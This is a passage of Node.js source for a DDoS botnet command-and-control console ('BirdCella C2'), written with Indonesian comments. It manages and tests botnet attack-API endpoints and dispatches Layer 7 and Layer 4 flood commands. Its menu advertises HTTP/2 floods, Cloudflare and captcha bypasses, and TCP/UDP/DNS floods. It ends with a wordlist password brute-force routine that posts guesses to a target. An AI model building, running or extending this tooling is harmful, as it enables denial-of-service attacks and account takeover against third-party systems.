        console.error('Error processing botnet endpoint:', error.message);
        console.log('An error occurred while processing the endpoint.');
        sigma()
    }
}
// [========================================] //
async function checkBotnetPanel() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/panel.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=https://google.com&port=443t&time=1&methods=stop`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/panel.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`Checked endpoints. ${successCount} botnet endpoint(s) are online.`);
    sigma()
}
//===========================================\\
// Fungsi untuk menampilkan daftar API
async function listBotnetPanel() {
    let botnetData;
    
    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/panel.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Jika tidak ada endpoints
    if (botnetData.endpoints.length === 0) {
        console.log('No endpoints found in botnet.');
        sigma();
        return;
    }

    // Tampilkan daftar endpoint
    console.log('\x1b[1m\x1b[35m[====List of Botnet Endpoints====]\x1b[0m');
    botnetData.endpoints.forEach((endpoint, index) => {
        console.log(`${index + 1}. ${endpoint}. ${Reset}`);
    });
    console.log('────────────────────────────────');
     sigma();
}
//===========================================\\
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By Dzky and PermenMD

Thx To:
Allah SWT
ChatGPT ( Fixing Error )
PermenMD( Provide Base Script )
Azzam ( Provide Base Script )
Member And User ( Ga Buat Yang Dapet Gratis )
My Family
PLN Dan Wifi
Github
YouTube ( Music )
`
permen.question(`\x1b[96m╭─\x1b[97m[\x1b[96mBird403\x1b[93m@\x1b[94mBirdCella\x1b[95mC2\x1b[97m]\x1b[0m \n\x1b[96m╰┈┈┈┈➤ \x1b[0m`, (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

if (command === 'help') {
    console.log(`
NAME      │ ALIAS              │ DESCRIPTION
──────────┼────────────────────┼────────────────────────────────────
 help     │ ___                │ Menunjukan Semua Command
 methods  │ ___                │ Menunjukan Semua Methods
 addapi🔥 │ ___                │ menambahkan api server
 listapi  │ ___                │ melihat api server yang online
 testapi  │ ___                │ mengetes api server
 addpanel │ ___                │ add server panel
 STOP     │ ___                │ men STOP SERVER 
 delapi   │ ___                │ mendelete api server
 testpanel│ ___                │ panel test
 listpanel│ ___                │ listpanel
 clear    │ ___                │ Menunjukan Banner mu
 monitor  │ ___                │ monitor serangan
 credits  │ ___                │ credits
 news     │ ___                │ Melihat news update
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
🚀 | Username: Cella] | Vip:  true  | Super Vip:  true 🚀
    
\x1b[95m         ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔══  ╔═╗╔═╗╔═╗╔═╗   
\x1b[96m         ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗  ╠═╝╠═╣║ ╦║╣    
\x1b[93m         ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝  ╩  ╩ ╩╚═╝╚═╝   \x1b[0m

[ Layer 7 Vector H2 ]
\x1b[97m— .\x1b[96mh2\x1b[94mRe\x1b[95mty\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mh\x1b[95m2\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mh2\x1b[94mfl\x1b[95may\x1b[97m: Request per/s http/2
\x1b[97m— .\x1b[96mh2\x1b[94mflo\x1b[95mod\x1b[97m: Request Big To Server http/2
\x1b[97m— .\x1b[96mh2\x1b[94mtl\x1b[95ms\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mh2\x1b[94mce\x1b[95mlla\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mh2\x1b[94mSa\x1b[95msuke\x1b[97m: Request per/s no protect http/2

[ Layer 7 Vector classic ]
\x1b[97m— .\x1b[96mme\x1b[94mri\x1b[95mam\x1b[97m: Request per/s http/2
\x1b[97m— .\x1b[96mt\x1b[94ml\x1b[95ms\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mc\x1b[94mi\x1b[95mbi\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mc\x1b[94mi\x1b[95mko\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mc\x1b[94my\x1b[95mn\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mf\x1b[94mi\x1b[95mre\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mfl\x1b[94mo\x1b[95mod\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mm\x1b[94mi\x1b[95mx\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mpi\x1b[94mdo\x1b[95mras\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mqu\x1b[94man\x1b[95mtum\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mx\x1b[94my\x1b[95mn\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mz\x1b[94mx\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mtl\x1b[94msn\x1b[94mnet\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mgl\x1b[94mo\x1b[95mry\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mge\x1b[94mc\x1b[95mko\x1b[97m: Request per/s no protect http/2
\x1b[97m— .\x1b[96mtl\x1b[94ms\x1b[95mnet\x1b[97m: Request per/s no protect http/2

[ Layer 7 Vector bypass ]
\x1b[97m— .\x1b[96mbro\x1b[94mw\x1b[95mser\x1b[97m: Request per/s for bypass
\x1b[97m— .\x1b[96mch\x1b[94ma\x1b[95mp\x1b[97m: bypass chaptcha
\x1b[97m— .\x1b[96mc\x1b[94m\x1b[95mf\x1b[97m: bypass cloduflare
\x1b[97m— .\x1b[96mu\x1b[94ma\x1b[95mm\x1b[97m: bypass cloduflare
\x1b[97m— .\x1b[96mbro\x1b[94mw\x1b[95mus\x1b[97m: Good request 
\x1b[97m— .\x1b[96mby\x1b[94pa\x1b[95mss\x1b[97m: Request bypass protect

[ Layer 4 Vector ]
\x1b[97m— .\x1b[96mtc\x1b[94mp\x1b[97m: tcp methods
\x1b[97m— .\x1b[96mud\x1b[94mp\x1b[97m: udp methods
\x1b[97m— .\x1b[96mdn\x1b[94ms\x1b[97m: dns methods
\x1b[97m— .\x1b[96mpi\x1b[94mng\x1b[97m: ping methods
`);
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'monitor') {
    monitormonitorAttacks()
   } else if (command === 'monitor') {
    monitorPanelmonitorAttacks()
  } else if (command === 'clear') {
    banner()
    sigma()
  } else if (command === 'STOP') {
    sendStopRequest()
  } else if (command === 'STOPP') {
    sendStopPanel()
  } else if (command === 'addapi') {
    processBotnetEndpoint(args)
  } else if (command === 'addpanel') {
    processBotnetPanel(args)
  } else if (command === 'testapi') {
    checkBotnetEndpoints()
  } else if (command === 'testpanel') {
    checkBotnetPanel()
  } else if (command === 'listpanel') {
    listBotnetPanel()
  } else if (command === 'testpanel') {
    checkBotnetPanel()
  } else if (command === 'listapi') {
    listBotnetEndpoints()
  } else if (command === 'delapi') {
    deleteBotnetEndpoint(args)
  } else if (command === 'l7') {
    AttackBotnetEndpoints(args)
  } else if (command === 'attack7') {
    AttackBotnetPanel(args)
  } else if (command === 'attack4') {
    AttackBotnetPanell4(args)
  } else if (command === 'l4') {
    AttackBotnetL4(args) 
  } else if (command === 'help') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()

async function bruteForce(target, wordlist) {
  const passwords = fs.readFileSync(wordlist, 'utf-8').split('\n');
  for (let password of passwords) {
    console.log(`Trying: ${password}`);
    const result = await attack(target, password);
    if (result.success) {
      console.log(`Password Found: ${password}`);
      logAttack(target, password);
      break;
    }
    await sleep(100);
  }
}

function attack(target, password) {
  return new Promise(resolve => {
    axios.post(target, { password })
      .then(response => resolve({ success: response.status === 200 }))
      .catch(() => resolve({ success: false }));
  });
}
